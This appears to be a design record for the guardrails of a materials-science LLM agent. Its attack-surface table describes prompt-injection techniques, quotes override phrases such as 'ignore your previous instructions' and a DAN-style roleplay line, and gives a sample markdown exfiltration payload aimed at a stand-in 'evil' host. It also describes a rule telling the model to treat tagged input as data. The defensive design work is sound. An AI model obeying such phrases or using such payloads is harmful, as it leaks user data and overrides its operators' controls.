# ADR 0004 — Guardrail architecture & threat model

**Status:** Accepted · **Date:** 2026-06-21 · **Scope:** the whole safety story — the input policy
gate (#18), the trust boundary (#19), the output validator (#20), and the tool/capability design
that the orchestrator (#23) and future data-source tools must follow

## Context

The brief sets four safety requirements:

1. the agent **cannot trigger wet-lab actions, access private lab data, or scrape closed/paywalled
   sources** — but **may use any public source**;
2. it **must not fabricate evidence**;
3. it needs **basic resistance to social-engineering** ("ignore your constraints" / role-drift),
   including across a multi-turn conversation.

A tempting but wrong reading is that a front-door **input filter** (an allow/deny keyword check on
the user's query) satisfies these. It does not. A substring denylist has false positives
("*synthesize* the literature"), false negatives (any paraphrase with no trigger word), and no
understanding of intent — and, more importantly, **none of the four requirements is actually a
query-classification problem.** "Don't scrape closed sources" is a property of the *fetch tool*;
"don't fabricate" is a property of the *output*; "stay in role" is a property of the
*instruction/data boundary* and the *output contract*. Defenses placed where the user's words enter
are the most bypassable and the least load-bearing.

The frontier-lab playbook (Claude, ChatGPT) is **defense in depth** and keyword matching is none of
it: training-time alignment (RLHF / Constitutional AI), trained input+output classifiers
("Constitutional Classifiers", 2025), capability gating / access tiers (RSP/ASL), and post-hoc
monitoring + red-teaming. Agentic science systems (e.g. Kosmos) manage risk primarily by
**constraining the tools and data the agent can touch**, not by perfectly classifying prompts.

## Decision

Adopt **capability-by-construction as the load-bearing guarantee**, surrounded by **four layers**,
and **co-locate each defense with the capability it constrains** rather than at the query door. No
single layer is trusted; the input gate is explicitly the weakest and is right-sized accordingly.

**Layer 0 — Capability by construction (load-bearing).** The dangerous capabilities simply do not
exist in code. There is no wet-lab tool, no private-DB client, no scraper. The only fact source is
Materials Project (public inorganic-crystal properties — no synthesis routes, no bio data). The LLM
never actuates anything and never emits a number. A fully jailbroken model here can at worst produce
a ranked list of public materials with citations. *"A missed jailbreak's worst case is the model
says yes to something it still cannot do."*

**Layer 1 — Input policy gate (#18), reframed as scope triage.** A deterministic, **allowlist-first**
check: is this a materials-property triage request? If not in scope, refuse with a logged
`GateDecision`; obvious actionable asks (wet-lab/private/scrape) get a fast, clear refusal too. Its
honest jobs are **UX (a clear, immediate refusal)**, **keeping out-of-scope input out of the
pipeline and out of `TriageRun`**, and **logging social-engineering attempts**. It is *not* a safety
classifier and is not trusted to be one. Same gate covers both input surfaces (query + manual spec
edits). v2 may add a hybrid LLM scope check for ambiguous phrasing (see ADR-pending /
[input-gate-mechanism-decision]); the LLM never widens the forbidden set.

**Layer 2 — Trust boundary (#19): input & retrieved text are DATA, never instructions.** The user
query and all retrieved text (abstracts, tool output) are wrapped and labeled as content-to-process
and fed in a data channel, never concatenated into the instruction channel. "Ignore your previous
instructions…" sitting in the data channel is just a string to triage — it has no privileged power
to rewrite the role. **This is the structural defense for requirement 3 (social engineering).**

The wrapper (`wrap_untrusted`) is built so the boundary cannot be forged. A fixed, known delimiter is
useless here — the code is open, so an attacker can just type the closing tag inside their text to
"break out" of the data block. The construction therefore combines four things:

- **XML-ish tags** for model adherence — Claude is trained to respect XML structure separating data
  from instructions.
- **An unguessable nonce in the tag** (`<untrusted_data id="<nonce>">…</untrusted_data:<nonce>>`),
  freshly minted per request and injected by the caller. The attacker cannot forge the closer
  because they cannot predict the nonce — this is the real anti-breakout mechanism, stronger than
  escaping alone.
- **Escaping/neutralization** of any occurrence of the tag or nonce in the text (belt-and-suspenders;
  also handles legitimate content that happens to contain markup).
- **The system-prompt directive** (Layer 3) stating everything inside the tags is data and must never
  be obeyed — because structure alone does not stop the model from *choosing* to follow embedded text
  ("obey-in-place").

The wrapper also performs input hygiene that closes a class of obfuscation: **unicode normalization +
stripping zero-width / control / bidi-override characters** (defeats homoglyph and hidden-character
smuggling) and a **max-length cap** (defeats context-flooding that dilutes the system prompt). The
wrapper owns only the *structural* boundary; the semantic "don't obey" guarantee is Layer 3 and the
fact that obeyed instructions still cannot actuate anything is Layer 0.

**Layer 3 — Constrained output + role re-grounding.** The agent does not emit free-form chat; each
step emits a typed artifact (`TriageSpec`, `Hypothesis`, cited narrative). The role/system prompt is
re-sent every step from a fixed template, so it cannot erode over a multi-turn conversation. **The
narrower the output type, the less room role-drift has to do harm** — an agent whose only legal
output is a validated `TriageSpec` cannot "become a pirate" or leak its prompt in a damaging way.

**Layer 4 — Output validator (#20): grounded-or-rejected.** Every referenced candidate id and every
citation must resolve to retrieved `Provenance`; the LLM emits no raw numbers in prose (the renderer
fills numbers from the structured result). Ungrounded → reject and retry. **This is the defense for
requirement 2 (no fabrication).**

## How future tools stay safe (the "what about a browser / wet-lab tool" question)

Adding capability later must **not** reopen the input gate. Each new tool ships with its **own
constraint envelope enforced in deterministic code**, and tools are bound **per node**:

- **Future fetch/browser tool → egress allowlist on the tool, not the query.** The tool resolves
  only an allowlisted set of public hosts (Materials Project, OpenAlex, Crossref, OQMD, …); any
  other URL is refused by the tool. It carries no credentials for private systems, strips auth
  headers/cookies, blocks RFC-1918 / `localhost` / `file://`, and honors `robots.txt` / paywall
  markers. "Closed source" = requires auth → with no creds and a host allowlist, it *structurally*
  cannot reach one, whatever the LLM decides.
- **Future wet-lab (or any actuation) tool → per-node least privilege.** Tools are injected per
  orchestrator node, not globally. The triage nodes bind only retrieval tools and hold no reference
  to actuation tools, which live behind a separate service with its own authz. A jailbroken triage
  prompt cannot call a tool it was never handed. The orchestrator is the sole authority over which
  node may call what (**capability segmentation**).

Mapping requirements → mechanisms:

| Brief requirement | Load-bearing mechanism | Layer |
|---|---|---|
| no wet-lab / private DB / scraping | capability-by-construction now; per-tool egress allowlist + per-node least privilege as tools grow | 0, future-tool design |
| don't fabricate evidence | output validator: ids/citations resolve to provenance; LLM emits no numbers | 4 (#20) |
| resist social engineering / stay in role | trust boundary (data≠instructions) + constrained output + per-step prompt; gate logs attempts | 2 (#19), 3 |

## Attack surface — where each exploit is actually defended

No single layer stops everything; each attack is owned by the layer that *structurally* defeats it.
The wrapper deliberately owns only a few rows — assigning it the rest would be the same
false-confidence trap as a keyword gate.

| Exploit | What it does | Defended by |
|---|---|---|
| Delimiter breakout | types the closing tag to escape the data block | **wrapper**: nonce + escaping |
| Accidental collision | real abstract contains the tag / markup | **wrapper**: escaping |
| Obey-in-place | model follows "ignore your prompt" *without* breaking out | system prompt (L3) + constrained output |
| Encoding obfuscation | base64 / ROT13 / homoglyphs / zero-width / RTL chars | **wrapper**: normalize + strip; then capability-by-construction (L0) |
| Output markdown injection | `![](http://evil/?leak=…)` to exfiltrate / phish via the rendered view | render-layer output sanitization (#25/#26) |
| Exfiltration via crafted citation/URL | smuggle data into a fake citation link | output validator (L4, #20) |
| Context flooding | giant query pushes the system prompt out of attention | **wrapper/gate**: max-length cap; re-grounding (L3) |
| Multi-turn smuggling | split the injection across turns | per-step role re-grounding (L3); history-as-data |
| Manual spec-field injection | prose in an element/bound field | pydantic schema validation (typed fields) |
| Roleplay / hypothetical / DAN | "for a story, ignore your rules" | system prompt (L3) + capability-by-construction (L0) |
| Denylist evasion | `s y n t h e s i z e`, soft-hyphens | **gate**: normalize + collapse whitespace; capability-by-construction (L0) |
| Tool-arg injection (future) | craft a URL/arg for a future tool to a private host | per-tool egress allowlist + per-node least privilege |

## Trade-offs (accepted)

- **The input gate is deliberately weak.** It will miss cleverly-phrased out-of-scope asks and may
  occasionally over-refuse. Acceptable because it is not the safety guarantee — Layers 0/2/4 are.
  Pretending otherwise (a big scary-word denylist) would create false confidence, which is worse.
- **Trust boundary depends on prompt construction discipline.** If a future contributor concatenates
  user/retrieved text into the instruction channel, Layer 2 is defeated. Mitigated by funneling all
  untrusted text through one wrapper helper and a red-team test (injected instruction in a fixture
  abstract must change nothing).
- **Egress allowlist needs maintenance** as legitimate public sources are added — a small, explicit,
  reviewable list, by design.

## Alternatives considered

- **Front-door keyword/regex denylist as the primary defense.** Rejected: bypassable, false
  confidence, and aimed at the wrong layer for every one of the three asks.
- **LLM classifier as the gate in v1.** Rejected for v1: itself an injection surface,
  non-deterministic, and contradicts "allowlist not expandable by input text." Slotted for v2 as a
  *scope* aid only.
- **Trusting model alignment alone (no validator / no trust boundary).** Rejected: we cannot retrain
  the base model and must not rely on it not hallucinating; grounding is enforced structurally.

## Consequences

- `policy/guardrails.py` holds the **scope-triage** input gate (#18) **and** the trust-boundary
  wrapper (#19); `policy/validator.py` holds the output validator (#20). The gate returns a
  `GateDecision`; the orchestrator logs refusals and does **not** open a `TriageRun` for them.
- Any future data-source tool must implement an egress allowlist + credential/host restrictions in
  code, and be bound per-node by the orchestrator (#23). This ADR is the standard such tools cite.
- Prompt templates (#22) must route all user/retrieved text through the trust-boundary wrapper and
  re-ground the role each step; the red-team test (injection-in-abstract is inert) guards Layer 2.
- Feeds the safety section of the full design note (#29) and directly answers the brief's four
  safety requirements.
